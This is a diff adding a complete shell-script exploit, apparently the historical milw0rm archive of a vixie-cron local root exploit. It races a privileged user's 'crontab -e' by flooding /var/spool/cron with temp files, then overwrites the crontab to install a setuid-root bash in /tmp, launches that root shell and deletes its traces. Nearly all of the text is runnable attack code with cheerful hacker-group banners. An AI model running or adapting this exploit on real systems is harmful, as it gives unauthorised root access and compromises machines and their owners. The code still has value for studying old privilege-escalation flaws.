@@ -1,0 +1,206 @@
+#!/bin/sh
+
+echo '.-------------------------------------------------------------------------.'
+echo '| Marchew Hyperreal Industries ................... <marchew@dione.ids.pl> |'
+echo "| ( ...well, it is just me, but it is more elite to speak as a group... ) |"
+echo "\`--------------------------------- presents ------------------------------'"
+echo
+echo '  * another vixie-cron root sploit by Michal Zalewski <lcamtuf@ids.pl> *   '
+echo
+echo '.-------------------------------------------------------------------------.'
+echo '| This time, it is somewhat more complicated. On some systems, it might   |'
+echo '| require some tuning, to be slower, but resources-effective. It expects  |'
+echo '| root (or other choosen user) to do "crontab -e" or "crontab /any/file"  |'
+echo '| sooner or later, and spoofs the legitimate cron entry file with evil    |'
+echo '| content, thus leading to account compromise (usually: root compromise). |'
+echo "\`-------------------------------------------------------------------------'"
+echo
+
+CYCLES=32768
+DESTUSER=root
+SHOULDTOOK=60
+
+VCRON="`strings /usr/bin/crontab 2>/dev/null|grep -i vixie`"
+
+if [ "$VCRON" = "" ]; then
+  echo "[-] Sorry, this box is not running vixie cron."
+  echo
+  exit 1
+else
+  echo "[+] Found Paul Vixie's /usr/bin/crontab utility."
+fi
+
+
+if [ -r /var/spool/cron ]; then
+  echo "[+] This box has exploitable /var/spool/cron..."
+else
+  echo "[-] Sorry, this box is not vulnerable to this attack."
+  echo
+  exit 1
+fi
+
+
+if [ -u /usr/bin/crontab ]; then
+  echo "[+] This box has setuid crontab utility..."
+else
+  echo "[-] Sorry, this box has no setuid crontab."
+  echo
+  exit 1
+fi
+
+cat >dowrite.c <<_EOF_
+main() {
+  lseek(1,0,0);
+  write(1,"* * * * * /tmp/.rootcron\n\n",26);
+  ftruncate(1,25);
+}
+_EOF_
+
+echo "[+] Compiling helper application #1..."
+
+gcc -o dowrite dowrite.c 
+
+if [ ! -f dowrite ]; then
+  echo "[-] Compilation failed."
+  echo
+  exit 1
+fi
+
+echo "[+] Application #1 compiled successfully."
+
+echo "[+] Creating helper application #2..."
+
+cat >/tmp/.rootcron <<_EOF_
+#!/bin/sh
+
+(
+  chown root.root /tmp/.r00tcr0n
+  chmod 6755 /tmp/.r00tcr0n
+  rm -f /var/spool/cron/tmp.*
+  crontab -r
+) &>/dev/null
+
+_EOF_
+
+cat >root.c <<_EOF_
+main() {
+  setuid(0); setgid(0);
+  unlink("/tmp/.r00tcr0n");
+  execl("/bin/bash","bash","-i",0);
+  perror("bash");
+}
+_EOF_
+
+echo "[+] Compiling helper application #3..."
+
+gcc -o /tmp/.r00tcr0n root.c
+
+if [ ! -f /tmp/.r00tcr0n ]; then
+  echo "[-] Compilation failed."
+  echo
+  exit 1
+fi
+
+echo "[+] Application #3 compiled successfully."
+
+
+X=0
+
+
+if [ ! "$1" = "noprep" ]; then
+
+  echo "[*] Attack against user $DESTUSER, doing $CYCLES setup cycles..."
+  echo "    Please be patient, setup might took some time; to skip it if"
+  echo "    /var/spool/cron on this machine is already initialized, use"
+  echo "    '$0 noprep'."
+
+  PROB=$[CYCLES*100/32768]
+  test "$PROB" -gt "100" && PROB=100
+
+  echo "[+] This gives almost $PROB% probability of success on the first attempt."
+
+  while [ "$X" -lt "$CYCLES" ]; do
+    X=$[X+1]
+    echo -ne "\r[?] Doing cycle $X of $CYCLES [$[X*100/CYCLES]% done]... "
+    umask 0
+    ( ( crontab /dev/urandom & usleep 1000; killall crontab ) & ) &>/dev/null 
+  done
+
+  sleep 3;killall -9 crontab &>/dev/null
+
+  echo
+  echo "[+] Setup complete, /var/spool/cron filled with junk tmp files."
+
+  CNT=0
+
+  echo "[*] Now, doing cleanup and counting the nodes..."
+
+  for i in 1 2 3 4 5 6 7 8 9; do
+    for j in /var/spool/cron/tmp.${i}*; do
+      echo -n >$j
+      echo -ne "\r[+] Node $CNT clean... "
+      CNT=$[CNT+1]
+    done
+  done
+
+  echo
+
+  PROB=$[CNT*100/32768]
+
+  echo "[+] Found $CNT nodes, approx. $PROB% chance..."
+
+  if [ "$CNT" -lt "$[CYCLES*2/3]" ]; then
+    echo "[-] Less than 66% of expected nodes were created. Try adjusting the exploit."
+    echo
+    exit 1
+  fi
+
+else
+
+  echo "[?] Skipping /var/spool/cron initialization. Results might be unpredictable."
+
+fi
+
+echo "[+] Now I will wait for $DESTUSER to edit his crontab. Could take some time."
+
+chmod 755 /tmp/.rootcron
+
+while :; do
+  sleep 1
+  GOT="`ps auxhw|grep ^$DESTUSER|grep crontab|grep -v grep|cut -b10-15|head -1`"
+  test "$GOT" = "" && continue
+  GOT=`echo $GOT`
+  echo "[+] Caught victim at pid $GOT..."
+  if [ ! -f /var/spool/cron/tmp.$GOT ]; then
+    echo "[-] DAMN! We have no node for this pid, bad luck..."
+    continue
+  fi
+  echo '[+] Got this node :) Entering event wait loop...'
+  export DESTUSER
+  (
+     G=blabla
+     while [ ! "$G" = "" ]; do
+       G="`ps auxhw|grep ^$DESTUSER|grep crontab|grep -v grep`"
+     done
+     sleep 1
+     echo "[+] Bingo! It happened. Now writing our evil content..." 1>&2
+     ./dowrite
+  ) >/var/spool/cron/tmp.$GOT
+  echo '* * * * * /bin/true' >.ctab
+  echo "[+] Evil content written. Trying to rehash the daemon..."
+  crontab .ctab
+  crontab -r
+  echo "[+] Entering event loop waiting for exploit to work..."
+  while [ ! -u /tmp/.r00tcr0n ]; do
+    sleep 1
+  done
+  rm -f .ctab dowrite dowrite.c /tmp/.rootcron root.c
+  echo "[+] Calling the main code..."
+  /tmp/.r00tcr0n
+  echo "[*] Thank you for choosing Marchew Industries."
+  echo
+  exit 1
+done  
+
+
+# milw0rm.com [2000-11-21]
